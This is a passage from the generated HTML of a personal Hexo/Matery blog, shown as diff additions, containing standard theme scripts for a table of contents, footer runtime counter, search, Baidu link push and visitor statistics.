+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: 浮生<br />'
+            + '文章作者: 浮生<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2019</span>
+            <a href="http://www.xpshuai.cn" target="_blank">浮生</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">325.3k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2019";
+                    var startMonth = "4";
+                    var startDate = "20";
+                    var startHour = "15";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+            <span id="icp"><img src="/medias/icp.png" style="vertical-align: text-bottom;" />
+                <a href="http://www.beianbeian.com/beianxinxi/816345dfd53e0153acde20c5bb1dd1b0.html" target="_blank">冀ICP备18027796号-1</a>
+            </span>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/shuai06" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:2944282625@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2944282625" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2944282625" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/search.xml", 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
